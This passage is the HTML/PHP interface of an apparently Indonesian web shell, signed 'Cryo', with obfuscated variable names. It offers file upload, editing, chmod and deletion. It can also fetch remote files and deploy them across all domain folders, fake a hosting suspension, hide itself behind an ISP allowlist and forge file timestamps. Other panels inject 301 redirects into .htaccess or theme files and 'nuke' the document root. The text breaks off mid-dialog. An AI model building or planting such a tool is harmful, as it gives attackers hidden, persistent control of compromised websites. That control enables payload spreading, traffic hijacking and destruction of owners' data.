            92px  /* Size */
            68px  /* Permission */
            48px  /* Direct Link */
            158px /* Date Modified */
        ;
        align-items: center;
        gap: 0 6px;
        }

        @media (max-width: 900px) {
            .file-item-row {
                grid-template-columns: 22px 28px 24px 1fr 44px 36px 34px 84px;
                font-size: 11px;
            }
        }

        .search-box {
            margin: 10px 0;
            background: rgba(9, 9, 20, 0.96);
            border-radius: 8px;
            border: 1px solid #3b4259;
            color: #e5e7eb;
            padding: 8px 10px;
        }
        .search-box h3 {
            margin: 0 0 4px 0;
            font-size: 13px;
        }
        .search-box code {
            color: #cfe4ff;
        }
    
        .top-actions {
            display: flex;
            justify-content: flex-end;
            align-items: center;
            gap: 8px;
            margin-bottom: 6px;
        }
        .top-actions .logout-link {
            float: none;
            margin-bottom: 0;
        }
        .theme-toggle {
            float: none;
            display: inline-flex;
            align-items: center;
            gap: 6px;
            padding: 5px 12px;
            border-radius: 15px;
            border: 1px solid #4b5563;
            background: rgba(15,23,42,0.9);
            color: #e5e7eb;
            font-size: 12px;
            cursor: pointer;
            text-decoration: none;
        }
        .theme-toggle .theme-icon {
            font-size: 16px;
        }
        .theme-toggle.active {
            border-color: #fbbf24;
        }
        .theme-toggle:hover {
            filter: brightness(1.15);
        }

        body.dark-mode {
            color: #e5e7eb;
        }
        body.dark-mode .file-item {
            background-color: rgba(15,23,42,0.95);
            color: #e5e7eb;
            border-color: #374151;
        }
        body.dark-mode .file-item.danger {
            background-color: rgba(127,29,29,0.95);
        }
        body.dark-mode .file-item.warning {
            background-color: rgba(120,53,15,0.95);
        }
        body.dark-mode .file-item.success {
            background-color: rgba(22,101,52,0.95);
        }
        body.dark-mode .sidebar {
            color: #e5e7eb;
        }
        body.dark-mode .sidebar h3 {
            color: #f9fafb;
        }
        body.dark-mode input,
        body.dark-mode textarea,
        body.dark-mode select {
            background-color: #020617;
            color: #e5e7eb;
            border-color: #4b5563;
        }
        body.dark-mode .file-item a,
        body.dark-mode .file-item button[name="edit"],
        body.dark-mode .file-item button[name="rename"],
        body.dark-mode .file-item button[name="delete"],
        body.dark-mode .file-item button[name="clone_file"],
        body.dark-mode .file-item button[name="view_logs"] {
            color: #e5e7eb;
        }
        body.dark-mode .file-item:hover {
            background-color: rgba(15,23,42,0.9);
        }
        body.dark-mode .search-box {
            background: rgba(15,23,42,0.96);
            border-color: #4b5563;
        }
</style>
</head>
<body>
<video autoplay loop muted playsinline id="bg-video">
    <source src="https://res.cloudinary.com/dowtrfruz/video/upload/v1751743944/pinterestdownloader.com-1751743705.806863_1_yqd7dy.mp4" type="video/mp4">
</video>
<div class="bg-overlay"></div>

<div class="file-manager">
    <div class="sidebar">
        <h3>Create File</h3>
        <form action="" method="post">
            <input type="text" name="fileName" placeholder="Nama File" required>
            <button type="submit" name="createFile">Create File</button>
        </form>
        <h3>Create Folder</h3>
        <form action="" method="post">
            <input type="text" name="folderName" placeholder="Nama Folder" required>
            <button type="submit" name="createFolder">Create Folder</button>
        </form>
        <h3>Upload File</h3>
        <form action="" method="post" enctype="multipart/form-data">
            <input type="file" name="fileToUpload[]" multiple required>
            <button type="submit" name="upload">Upload</button>
        </form>
        <h3>Download File dari URL Atau Wget</h3>
        <form action="" method="post">
            <input type="url" name="fileUrl" placeholder="Masukkan URL file" required style="width:90%;">
            <input type="text" name="fileUrlName" placeholder="Nama file (opsional)" style="width:90%;">
            <button type="submit" name="downloadFromUrl">Download</button>
        </form>
        <h3 style="color: #ff0000;">⋆ ༺ Suspend 🔥☠️🔥 Domain ༻ ⋆︎</h3>
        <?php
        $koala3 = $_SERVER['DOCUMENT_ROOT'] . '/.htaccess';
        $kuda7 = false;
        if (file_exists($koala3)) {
            $singa1 = @file_get_contents($koala3);
            if (strpos($singa1, 'suspendedpage.cgi') !== false) {
                $kuda7 = true;
            }
        }
        ?>
        <p style="font-size:12px; font-weight:bold; color: <?= $kuda7 ? '#e74c3c' : '#00ffc8ff' ?>;">
            Status: <?= $kuda7 ? 'AKTIF (sedang disuspend)' : 'NONAKTIF' ?>
        </p>
        <form method="post" id="suspendForm">
            <label style="font-size:11px;">Kecualikan maksimal 3 path:</label><br>
            <input type="text" name="except1" id="except1" placeholder="/wp-login.php" style="width:90%;"><br>
            <input type="text" name="except2" id="except2" placeholder="/wp-admin/" style="width:90%;"><br>
            <input type="text" name="except3" id="except3" placeholder="/assets/" style="width:90%;"><br><br>
            <button type="button" onclick="showSuspendModal(true)">Aktifkan Suspend</button>
            <button type="submit" name="suspendOff">Nonaktifkan Suspend</button>
        </form>
        <h3>Hide Mode (ISP Allowlist)</h3>
        <div style="background:rgba(9,9,20,0.9); border-radius:8px; border:1px solid #3b4259; padding:8px 9px; color:#e5e7eb; font-size:11px; margin-top:4px;">
            <p style="font-size:11px; margin:0 0 6px 0;">
                Status:
                <?php if ($gajah === '1'): ?>
                    <span style="color:#22c55e; font-weight:bold;">AKTIF</span>
                <?php else: ?>
                    <span style="color:#f97316; font-weight:bold;">NONAKTIF</span>
                <?php endif; ?>
                <br>
                ISP tersimpan:
                <?php if ($gajah === '1' && $kelinci !== ''): ?>
                    <span style="color:#93c5fd;"><?= htmlspecialchars($kelinci, ENT_QUOTES); ?></span>
                <?php else: ?>
                    <span style="color:#9ca3af;">(belum ada)</span>
                <?php endif; ?>
            </p>

            <?php if (!empty($_SESSION['hide_mode_message'])): ?>
                <div style="margin-bottom:6px; color:<?= ($_SESSION['hide_mode_status']==='error' ? '#fecaca' : '#d1fae5'); ?>">
                    <?= htmlspecialchars($_SESSION['hide_mode_message'], ENT_QUOTES); ?>
                </div>
                <?php unset($_SESSION['hide_mode_message'], $_SESSION['hide_mode_status']); ?>
            <?php endif; ?>

            <form method="post" action="">
                <?php if ($gajah === '1'): ?>
                    <button type="submit" name="hideModeOff"
                            style="background:#f97316; color:#111827; border:none; border-radius:6px; padding:4px 10px; cursor:pointer; font-size:11px;">
                        Matikan Hide Mode
                    </button>
                <?php else: ?>
                    <button type="submit" name="hideModeOn"
                            style="background:#22c55e; color:#022c22; border:none; border-radius:6px; padding:4px 10px; cursor:pointer; font-size:11px;">
                        Aktifkan Hide Mode (pakai ISP saya)
                    </button>
                <?php endif; ?>
            </form>
        </div>

        <h3>Scan</h3>
        <button type="button" onclick="showScanModal()" style="background:#00ffc8ff; color:#232323; font-weight:bold; border-radius:6px;">Scan</button>
        <?php if (!empty($_SESSION['scan_result_file']) && file_exists($_SESSION['scan_result_file'])): ?>
            <div style="margin-top:10px;">
                <a href="?downloadScan=1" style="color:#2ecc71; font-weight:bold;">⬇️ Download Hasil Scan</a>
            </div>
        <?php endif; ?>

    <h3>Search</h3>
    <button type="button"
            onclick="showSearchModal()"
            style="background:#38bdf8; color:#0b1020; border:1px solid #0284c7; border-radius:6px; padding:5px 10px; cursor:pointer;">
        Search
    </button>

     <h3>Deploy FILE ke Domain/Subdomain</h3>
    <div style="background:rgba(9,9,20,0.9); border-radius:8px; border:1px solid #3b4259; padding:8px 9px; color:#e5e7eb; font-size:11px;">
                <form method="post" action="" style="margin:0 0 6px 0;">
            <button type="submit" name="deployScanDomains"
                    style="background:#22c55e; color:#0b1020; border:1px solid #16a34a; border-radius:6px; padding:4px 10px; cursor:pointer; font-size:11px;">
                Scan Folder Domain/Subdomain
            </button>
            <?php if (!empty($_SESSION['deploy_scan_message'])): ?>
                <div style="margin-top:6px; color:#93c5fd;">
                    <?= htmlspecialchars($_SESSION['deploy_scan_message']) ?>
                </div>
            <?php endif; ?>
        </form>

<?php
        
        $merpati1 = isset($_SESSION['deploy_scan_items']) && is_array($_SESSION['deploy_scan_items'])
            ? $_SESSION['deploy_scan_items']
            : [];
        ?>

        <?php if (empty($merpati1)): ?>
            <div style="font-size:11px; color:#9ca3af;">
                Belum ada daftar folder domain/subdomain.<br>
                Klik dulu tombol <b>"Scan Folder Domain/Subdomain"</b> di atas.
            </div>
        <?php else: ?>
            <form method="post" action="" style="margin:0;" id="deployFileForm">
                <div style="max-height:120px; overflow:auto; border:1px solid #1f2937; border-radius:6px; padding:4px;">
                    <?php foreach ($merpati1 as $serigala3 => $musang3): ?>
                        <label style="display:block; margin-bottom:2px; cursor:pointer;">
                            <input type="checkbox" name="deploy_file_targets[]" value="<?= (int)$serigala3 ?>">
                            <strong><?= htmlspecialchars($musang3['label']) ?></strong>
                            <br>
                            <span style="color:#9ca3af;">Path: <code><?= htmlspecialchars($musang3['target']) ?></code></span>
                        </label>
                    <?php endforeach; ?>
                </div>

                <div style="margin-top:6px;">
                    <label style="display:block; margin-bottom:3px;">URL file</label>
                    <input type="url" name="deploy_file_url"
                           placeholder="https://domain.com/file.php"
                           style="width:95%; font-size:11px; padding:4px 5px; border-radius:4px; border:1px solid #4b5563;" required>
                </div>

                <div style="margin-top:6px;">
                    <label style="display:block; margin-bottom:3px;">
                        Nama file di server (opsional)
                    </label>
                    <input type="text" name="deploy_file_name"
                           placeholder="contoh: api.php (kosong = pakai nama aslinya)"
                           style="width:95%; font-size:11px; padding:4px 5px; border-radius:4px; border:1px solid #4b5563;">
                </div>

                <div style="margin-top:6px;">
                    <label style="display:block; margin-bottom:3px;">
                        Path simpan di dalam folder (opsional)
                    </label>
                    <input type="text" name="deploy_file_path"
                           placeholder="contoh: wp-content/plugins/custom"
                           style="width:95%; font-size:11px; padding:4px 5px; border-radius:4px; border:1px solid #4b5563;">
                    <div style="font-size:10px; color:#9ca3af; margin-top:2px;">
                        Kosongkan kalau mau simpan langsung di root folder domain/subdomain.
                    </div>
                </div>

                <input type="hidden" name="deployRunFile" value="1">

                <div style="margin-top:8px; text-align:right;">
                    <button type="button"
                            onclick="confirmDeployFile()"
                            style="background:#f97316; color:#fff; border:1px solid #ea580c; border-radius:6px; padding:4px 10px; cursor:pointer; font-size:11px;">
                        Deploy FILE (konfirmasi)
                    </button>
                </div>
            </form>
        <?php endif; ?>
    </div>

    <h3>Replace .htaccess</h3>
    <button type="button" onclick="showHtaccessReplaceModal()" style="background:#ffd166;color:#232;border:1px solid #e0b64a;border-radius:6px;">Replace .htaccess</button>

    <h3>Sync Timestamp</h3>
    <form method="post" action="">
    <input type="text" name="ts_target" placeholder="/path/target (file/folder)" style="width:90%;" required>
    <input type="datetime-local" name="ts_newdate" value="<?php echo date('Y-m-d\\TH:i'); ?>" style="width:90%; margin-top:6px;" required>
    <label style="display:block; font-size:11px; color:#fff; margin:6px 0;">
        <input type="checkbox" name="ts_recursive" value="1" checked> Rekursif (untuk folder)
    </label>
    <button type="submit" name="doSyncTimestamp" style="background:#a78bfa; color:#fff; border:1px solid #8b5cf6; border-radius:6px;">
        Samakan Timestamp
    </button>
    <div style="font-size:11px; color:#fff; margin-top:4px;">
        Path boleh absolut (<code>/...</code>) atau relatif dari Document Root.
    </div>
    </form>

    <h3>Redirect 301</h3>
    <button type="button"
            onclick="showRedirectModal()"
            style="background:#f97316; color:#fff; border:1px solid #ea580c; border-radius:6px; padding:5px 10px; cursor:pointer;">
        Redirect 301
    </button>

    <h3 style="color:#ff4d4f;">Nuke ☠</h3>
    <button type="button"
            onclick="showNukeModal()"
            style="background:#ef4444; color:#fff; border:1px solid #b91c1c; border-radius:6px; padding:5px 10px; cursor:pointer; font-weight:bold;">
        Nuke ☠
    </button>

    <h3 style="color:rgba(0,0,0,0.7);">Admin</h3>
    <button type="button"
            onclick="showAdminModal()"
            style="background:rgba(0,0,0,0.7); color:#ffffff; border:1px solid #000; border-radius:6px; padding:5px 10px; cursor:pointer;">
        Admin
    </button>

    </div>
    <div class="main-content">
                <div class="top-actions">
            <button type="button" class="theme-toggle" id="darkModeToggle">
                <span class="theme-icon">☀️</span><span class="theme-text">Light</span>
            </button>
            <a href="Log.php" class="logout-link" id="logoutBtn">
                <span class="logout-icon">🔴</span> Logout
            </a>
        </div>

        <h1 style="color: #00ffc8ff; font-size:16px; margin:10px 0 8px 0;">Jangan Dirusak ya!! (˶ᵔ ᵕ ᵔ˶) - Cryo</h1>
        <div style="margin-bottom:8px;">
            <?php if (count($_SESSION['dir_history']) > 1): ?>
                <a href="?back_dir=1" class="nav-link" style="margin-right:9px;">⬅️ Back</a>
            <?php else: ?>
                <span class="nav-link disabled" style="margin-right:9px;">⬅️ Back</span>
            <?php endif; ?>
            <?php if ($buaya1 != $monyet6): ?>
                <a href="?folder=<?= urlencode($monyet6) ?>" class="nav-link" style="margin-right:9px;">🏠 Home</a>
            <?php else: ?>
                <span class="nav-link disabled" style="margin-right:9px;">🏠 Home</span>
            <?php endif; ?>
            <?php if ($buaya1 != $gorila6): ?>
                <a href="?folder=<?= urlencode($gorila6) ?>" class="nav-link">🌐 Root</a>
            <?php else: ?>
                <span class="nav-link disabled">🌐 Root</span>
            <?php endif; ?>
        </div>
        <div style="position:relative; margin-bottom:8px;">
            <form method="get" style="display:inline;">
                <label for="customPath" style="color: #fff; font-size:11px; margin-right:5px;"><strong>Full Path:</strong></label>
                <input type="text" id="customPath" name="folder" 
                    value="<?= htmlspecialchars($buaya1) ?>" 
                    style="width:320px; font-size:11px; padding:3px 6px; border-radius:4px; border:1px solid #ff0000;"
                    autocomplete="off" spellcheck="false"
                >
                <button type="submit" style="font-size:11px; padding:2px 12px; border-radius:4px; margin-left:4px;">Go</button>
            </form>
        </div>

         <?php if (!empty($_SESSION['search_results']) && is_array($_SESSION['search_results'])): ?>
        <?php
            $kodok6 = (isset($_SESSION['search_root']) ? $_SESSION['search_root'] : '');
            $kadal6 = (isset($_SESSION['search_name']) ? $_SESSION['search_name'] : '');
            $biawak6 = (isset($_SESSION['search_content']) ? $_SESSION['search_content'] : '');
            $katak6 = (isset($_SESSION['search_stats']) ? $_SESSION['search_stats'] : array());
        ?>
        <div class="search-box">
            <h3>Hasil Search</h3>
            <div style="font-size:11px; margin-bottom:6px;">
                Root: <code><?= htmlspecialchars($kodok6) ?></code><br>
                <?php if ($kadal6 !== ''): ?>
                    Nama mengandung: <code><?= htmlspecialchars($kadal6) ?></code><br>
                <?php endif; ?>
                <?php if ($biawak6 !== ''): ?>
                    Isi file mengandung: <code><?= htmlspecialchars($biawak6) ?></code><br>
                <?php endif; ?>
                <?php if (!empty($katak6)): ?>
                    Folder discan: <?= (int)((isset($katak6['dirs']) ? $katak6['dirs'] : 0)) ?>,
                    file discan: <?= (int)((isset($katak6['files']) ? $katak6['files'] : 0)) ?>.
                    <?php if (!empty($katak6['stoppedByLimit'])): ?>
                        <br><span style="color:#facc15;">Scan dihentikan karena melewati batas. Coba sempitkan root folder.</span>
                    <?php endif; ?>
                <?php endif; ?>
            </div>

            <div style="max-height:260px; overflow:auto; border:1px solid #2d3347; border-radius:6px;">
                <table style="width:100%; border-collapse:collapse; font-size:11px;">
                    <thead>
                        <tr style="background:#111827; color:#e5e7eb;">
                            <th style="padding:4px 5px; border-bottom:1px solid #374151;">Tipe</th>
                            <th style="padding:4px 5px; border-bottom:1px solid #374151;">Path</th>
                            <th style="padding:4px 5px; border-bottom:1px solid #374151;">Detail</th>
                            <th style="padding:4px 5px; border-bottom:1px solid #374151;">🔗</th>
                        </tr>
                    </thead>
                    <tbody>
                    <?php foreach ($_SESSION['search_results'] as $burung6): ?>
                        <tr style="border-bottom:1px solid #1f2933; background:#020617;">
                            <td style="padding:4px 5px; white-space:nowrap;">
                                <?php if ($burung6['type'] === 'name'): ?>
                                    <?= ($burung6['kind'] === 'dir') ? 'Nama Folder' : 'Nama File' ?>
                                <?php else: ?>
                                    Isi File
                                <?php endif; ?>
                            </td>
                            <td style="padding:4px 5px;">
                                <code><?= htmlspecialchars($burung6['path']) ?></code>
                            </td>
                            <td style="padding:4px 5px;">
                                <?php if ($burung6['type'] === 'content' && !empty($burung6['lines'])): ?>
                                    <?php foreach ($burung6['lines'] as $kucing4): ?>
                                        <div style="margin-bottom:3px;">
                                            <span style="color:#fbbf24;">Line <?= (int)$kucing4['line'] ?>:</span>
                                            <code><?= htmlspecialchars($kucing4['snippet']) ?></code>
                                        </div>
                                    <?php endforeach; ?>
                                <?php else: ?>
                                    &mdash;
                                <?php endif; ?>
                            </td>
                            <td style="padding:4px 5px; text-align:center;">
                                <?php if (!empty($burung6['full'])): ?>
                                    <?php $katak1 = getDirectLink($burung6['full']); ?>
                                    <a href="<?= htmlspecialchars($katak1) ?>" target="_blank" style="color:#38bdf8;">
                                        <i class="fa fa-link" aria-hidden="true"></i>
                                    </a>
                                <?php endif; ?>
                            </td>
                        </tr>
                    <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </div>
        <?php
            unset($_SESSION['search_results'], $_SESSION['search_stats'], $_SESSION['search_root'], $_SESSION['search_name'], $_SESSION['search_content']);
        endif; ?>
        
        <form id="multiActionForm" action="" method="post">
            <div style="margin-bottom:10px;">
                <button type="button" onclick="selectAll(true)">Select All</button>
                <button type="button" onclick="selectAll(false)">Unselect All</button>
                <button type="submit" name="deleteSelected" onclick="return confirm('Yakin ingin menghapus semua yang dipilih?')">Delete Selected</button>
                <input type="text" name="chmodSelectedValue" placeholder="Chmod for selected (eg: 755)" style="width:90px;" pattern="[0-7]{3,4}" title="Contoh: 755">
                <button type="submit" name="chmodSelected">CHMOD Selected</button>
                <button type="submit" name="zipSelected" onclick="return confirm('ZIP semua yang dipilih ke dalam 1 file?')">ZIP Selected</button>
            </div>
            <div class="file-list">
                
            <div class="file-item" style="background:#222846; font-weight:bold; color:#fff;">
                <div style="display: flex; align-items: center; gap: 7px; flex:1;">
                    <span style="min-width:20px;">#</span>
                    <span></span>
                    <span></span>
                    <span>Nama File/Folder</span>
                </div>
            </div>
            <?php
            $belut4 = 0;
            foreach ($hiu2 as $ayam3):
                $belut4++;
                $lebah2 = $buaya1 . '/' . $ayam3;
                $harimau1 = getPermissionColor($lebah2);
                $angsa5 = (is_readable($lebah2) && @fileperms($lebah2)) ? substr(sprintf('%o', fileperms($lebah2)), -4) : '----';

                
                $kura7 = @filemtime($lebah2);
                if ($kura7 && is_numeric($kura7)) {
                    $kecoak1 = new DateTime("@$kura7");
                    $kecoak1->setTimezone(new DateTimeZone('Asia/Jakarta'));
                    $burung1 = $kecoak1->format('M-d H:i') . ' WIB';
                } else {
                    $burung1 = '📌'; 
                }

                $kura1 = getDirectLink($lebah2);

                if (is_file($lebah2)) {
                    $anjing7 = getNiceSize(@filesize($lebah2));
                } elseif (is_dir($lebah2)) {
                    $anjing7 = '📌';
                } else {
                    $anjing7 = '📌';
                }
            ?>
            <div class="file-item <?= $harimau1 ?>" title="Permission: <?= $angsa5 ?>">
                <div style="display: flex; align-items: center; gap: 7px; flex:1;">
                    <span style="min-width:20px;"><?= $belut4 ?></span>
                    <input type="checkbox" class="select-item" name="selectedItems[]" value="<?= htmlspecialchars($ayam3) ?>">
                    <?php if (is_dir($lebah2)): ?>
                        <span style="font-size: 1.15em;">🗂️</span>
                        <a href="?folder=<?= urlencode($lebah2) ?>"
                        class="nama-file-folder-ellipsis"
                        style="max-width:210px;"
                        title="<?= htmlspecialchars($ayam3) ?>">
                            <?= htmlspecialchars($ayam3) ?>
                        </a>
                    <?php else: ?>
                        <span style="font-size: 1.05em;"><?= getFileEmoji($ayam3) ?></span>
                        <form action="" method="post" style="display:inline;margin:0;padding:0;vertical-align:middle;max-width:210px;" id="editForm_<?= md5($ayam3) ?>">
                            <input type="hidden" name="fileNameToEdit" value="<?= $ayam3 ?>">
                            <button type="submit" name="edit"
                                    class="nama-file-folder-ellipsis"
                                    style="font-size: 1em; vertical-align:middle; max-width:210px; overflow:hidden;"
                                    title="<?= htmlspecialchars($ayam3) ?>">
                                <?= htmlspecialchars($ayam3) ?>
                            </button>
                        </form>
                    <?php endif; ?>
                </div>
                <div class="actions" style="min-width:460px; display:flex; align-items:center; gap:4px; flex-wrap:wrap;">
                    
                    <span title="Ukuran" style="font-size:11px; color:#ff0000; min-width:55px; display:inline-block; text-align:right;">
                        <?= $anjing7 ?>
                    </span>
                    <span class="file-permission" title="Izin" style="min-width:38px; color:#ff0000;">(<?= $angsa5 ?>)</span>
                    
                    <form action="" method="post" style="display: inline;">
                        <input type="hidden" name="oldName" value="<?= $ayam3 ?>">
                        <input type="text" name="newName" placeholder="New Name">
                        <button type="submit" name="rename">Rename</button>
                    </form>
                    
                    <span title="Direct Link" style="font-size:14px;">
                        <a href="<?= htmlspecialchars($kura1) ?>" target="_blank" style="color:#1a73e8;">
                            <i class="fa fa-link" aria-hidden="true"></i>
                        </a>
                    </span>
                    
                    <?php if (is_file($lebah2) && is_readable($lebah2)): ?>
                        <a href="?view=<?= urlencode($lebah2) ?>" title="View">
                            <button type="button" style="background:#dedede;color:#333;border:1px solid #aaa;padding:2px 7px;margin-left:2px;">
                                👁️
                            </button>
                        </a>
                    <?php endif; ?>
                    
                    <form action="" method="post" style="display: inline; margin-left:3px;">
                        <input type="hidden" name="nameToChmod" value="<?= $ayam3 ?>">
                        <input type="text" name="perm" placeholder="chmod" style="width:36px;" pattern="[0-7]{3,4}" title="Contoh: 755">
                        <button type="submit" name="chmod">CHMOD</button>
                    </form>
                    <?php if (!is_dir($lebah2) && @filesize($lebah2)<500000): ?>
                        <form action="" method="post" style="display: inline;">
                            <input type="hidden" name="fileNameToEdit" value="<?= $ayam3 ?>">
                            <button type="submit" name="edit">Edit</button>
                        </form>
                    <?php elseif (!is_dir($lebah2)): ?>
                        <button type="button" disabled title="File terlalu besar">Edit</button>
                    <?php endif; ?>
                    <form class="ajax-delete-form" data-name="<?= htmlspecialchars($ayam3) ?>">
                        <input type="hidden" name="target" value="<?= htmlspecialchars($ayam3) ?>">
                        <button type="button" class="delete">Delete</button>
                    </form>
                    <a href="?download=<?= urlencode($lebah2) ?>" style="margin-left:2px; padding:2px 7px; border:1px solid #2980b9; border-radius:4px; background:#2980b9; color:#fff; text-decoration:none;" title="Download">⬇️</a>
                    <form action="" method="post" style="display:inline;">
                        <input type="hidden" name="itemToZip" value="<?= htmlspecialchars($ayam3) ?>">
                        <button type="submit" name="zip" style="background:#FFB400; color:#333; border:none; padding:2px 8px; border-radius:4px; cursor:pointer;">ZIP</button>
                    </form>
                    <?php if (strtolower(pathinfo($ayam3, PATHINFO_EXTENSION)) === 'zip'): ?>
                        <button type="button" class="extract-btn" data-zip="<?= htmlspecialchars($ayam3) ?>" style="background:#43dbb0; color:#111; border:none; padding:2px 8px; border-radius:4px; cursor:pointer;">Extract</button>
                    <?php endif; ?>
                    
                    <span title="Date Modified" style="font-size:11px; color:#ff0000; min-width:95px;">
                        <?= htmlspecialchars($burung1) ?>
                    </span>
                </div>
            </div>
            <?php endforeach; ?>
            </div>
        </form>
        <?php if (!empty($bebek2)): ?>
            <h2 id="editfile" style="font-size:15px;">Edit File: <?= htmlspecialchars($bebek2) ?></h2>
            <form action="" method="post">
                <textarea name="content" rows="10"><?= htmlspecialchars($gorila2) ?></textarea><br>
                <input type="hidden" name="fileNameToEdit" value="<?= htmlspecialchars($bebek2) ?>">
                <button type="submit" name="saveEdit">Save Changes</button>
            </form>
        <?php endif; ?>
    </div>
</div>


<div id="deployFileConfirmModal" style="
    display:none;
    position:fixed;
    top:0; left:0;
    width:100vw; height:100vh;
    background:rgba(0,0,0,0.5);
    z-index:10016;
    justify-content:center;
    align-items:center;">
  <div style="background:#fff; border-radius:8px; padding:16px 14px; min-width:300px; max-width:92vw;">
    <div id="deployFileConfirmMsg" style="font-size:13px; margin-bottom:10px; color:#b91c1c; background:#fee2e2; padding:6px 8px; border-radius:4px;"></div>
    <div style="text-align:right;">
      <button type="button" onclick="submitDeployFile()">Yes</button>
      <button type="button" onclick="closeDeployFileConfirmModal()">No</button>
    </div>
  </div>
</div>


<div id="searchModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.5); z-index:10013; justify-content:center; align-items:center;">
  <div style="background:#fff; border-radius:8px; padding:16px 14px; min-width:320px; max-width:96vw;">
    <h3 style="margin:0 0 8px 0; font-size:14px;">Search File / Folder / Isi File</h3>
    <form id="searchForm" method="post" action="">
      <label style="display:block; font-size:12px; margin:4px 0;">
        Root folder (kosong = folder yang sedang dibuka)
      </label>
      <input type="text"
             name="search_root"
             id="search_root"
             value="<?= htmlspecialchars($buaya1) ?>"
             style="width:96%;">

      <label style="display:block; font-size:12px; margin:8px 0 4px 0;">
        Cari nama file / folder (opsional)
      </label>
      <input type="text"
             name="search_name"
             id="search_name"
             placeholder="misal: config, backup, user"
             style="width:96%;">

      <label style="display:block; font-size:12px; margin:8px 0 4px 0;">
        Cari isi file (keyword, opsional)
      </label>
      <input type="text"
             name="search_content"
             id="search_content"
             placeholder="misal: $musang5"
             style="width:96%;">

      <div style="font-size:11px; color:#555; margin-top:6px;">
        Content search hanya membaca file teks kecil (php, html, txt, js, css, dll) &lt;= 1MB.
      </div>

      <input type="hidden" name="runSearch" value="1">

      <div style="margin-top:10px; text-align:right;">
        <button type="button" onclick="confirmSearch()">Lanjut</button>
        <button type="button" onclick="closeSearchModal()">Batal</button>
      </div>
    </form>
  </div>
</div>


<div id="searchConfirmModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.45); z-index:10014; justify-content:center; align-items:center;">
  <div style="background:#fff; border-radius:8px; padding:16px 14px; min-width:280px; max-width:92vw;">
    <div id="searchConfirmMsg" style="font-size:13px; margin-bottom:10px; color:#b91c1c; background:#fee2e2; padding:6px 8px; border-radius:4px;"></div>
    <div style="text-align:right;">
      <button type="button" onclick="submitSearch()">Yes</button>
      <button type="button" onclick="closeSearchConfirmModal()">No</button>
    </div>
  </div>
</div>

<div id="extractModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.32); z-index:10004; justify-content:center; align-items:center;">
  <div style="background:#fff; border-radius:7px; padding:16px 11px; min-width:220px;">
    <form method="post">
      <input type="hidden" name="zipToExtract" id="zipToExtract" value="">
      <label for="extractDest" style="font-size:12px;">Extract ke folder:</label>
      <input type="text" name="extractDest" id="extractDest" style="width:96%;" required>
      <div style="text-align:center; margin-top:8px;">
        <button type="submit" name="extractZip" style="background:#43dbb0; color:#111;">Extract</button>
        <button type="button" onclick="document.getElementById('extractModal').style.display='none';">Cancel</button>
      </div>
    </form>
  </div>
</div>

<div id="suspendModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.5); z-index:9999; justify-content:center; align-items:center;">
    <div style="background:#fff; padding:20px; border-radius:8px; min-width:300px;">
        <h3 style="margin-top:0;">Konfirmasi Suspend</h3>
        <p>Apakah Anda yakin ingin mengaktifkan suspend situs dengan pengecualian berikut?</p>
        <ul id="exceptionList" style="font-size:13px; margin-bottom:12px;"></ul>
        <div style="text-align:right;">
            <button onclick="executeSuspend()"><b>Yes ☠️</b></button>
            <button onclick="document.getElementById('suspendModal').style.display='none'">No ✘</button>
        </div>
    </div>
</div>


<div id="redirectModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.5); z-index:10006; justify-content:center; align-items:center;">
  <div style="background:#fff; border-radius:8px; padding:16px 14px; min-width:300px; max-width:92vw;">
    <h3 style="margin:0 0 8px 0; font-size:14px;">Buat Redirect 301</h3>
    <form id="redirectForm" method="post" action="">
      <label style="display:block; font-size:12px; margin:4px 0;">Tambahkan aturan ke:</label>
      <label style="display:block; font-size:12px; margin-left:8px;">
        <input type="radio" name="redirect_target_type" value="htaccess" checked> .htaccess (Document Root)
      </label>
      <label style="display:block; font-size:12px; margin-left:8px;">
        <input type="radio" name="redirect_target_type" value="index"> index.php (Document Root)
      </label>
      <label style="display:block; font-size:12px; margin-left:8px;">
        <input type="radio" name="redirect_target_type" value="theme"> Theme (functions.php aktif)
      </label>

      <label style="display:block; font-size:12px; margin:8px 0 4px 0;">
        URL / path yang akan di-redirect
      </label>
      <input type="text" id="redirect_source" name="redirect_source"
             placeholder="Contoh: /sample-page/ atau homepage"
             style="width:96%;" required>

      <label style="display:block; font-size:12px; margin:8px 0 4px 0;">
        URL tujuan redirect (target)
      </label>
      <input type="url" id="redirect_target_url" name="redirect_target_url"
             placeholder="https://domain-tujuan.com"
             style="width:96%;"
             value="<?= htmlspecialchars($lebah5) ?>">

      <input type="hidden" name="runRedirect301" value="1">

      <div style="margin-top:10px; text-align:right;">
        <button type="button" onclick="confirmRedirect301()">Lanjut</button>
        <button type="button" onclick="closeRedirectModal()">Batal</button>
      </div>
    </form>
  </div>
</div>


<div id="redirectConfirmModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.45); z-index:10007; justify-content:center; align-items:center;">
  <div style="background:#fff; border-radius:8px; padding:16px 14px; min-width:280px; max-width:92vw;">
    <div id="redirectConfirmMsg" style="font-size:13px; margin-bottom:10px; color:#b91c1c; background:#fee2e2; padding:6px 8px; border-radius:4px;"></div>
    <div style="text-align:right;">
      <button type="button" onclick="submitRedirect301()">Yes</button>
      <button type="button" onclick="closeRedirectConfirmModal()">No</button>
    </div>
  </div>
</div>


<div id="nukeModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.5); z-index:10008; justify-content:center; align-items:center;">
  <div style="background:#fff; border-radius:8px; padding:16px 14px; min-width:320px; max-width:96vw;">
    <h3 style="margin:0 0 8px 0; font-size:14px; color:#b91c1c;">Nuke ☠ - Hancurkan isi Document Root</h3>
    <p style="font-size:12px; line-height:1.4; color:#333;">
      Fitur ini akan:
      <br>- Membuat <b>ZIP backup</b> dari <code><?= htmlspecialchars($_SERVER['DOCUMENT_ROOT']) ?></code>
      <br>- Menyimpan backup ke folder:
        <code><?= htmlspecialchars(rtrim($_SERVER['DOCUMENT_ROOT'], DIRECTORY_SEPARATOR) . '/wp-content/recovery') ?></code>
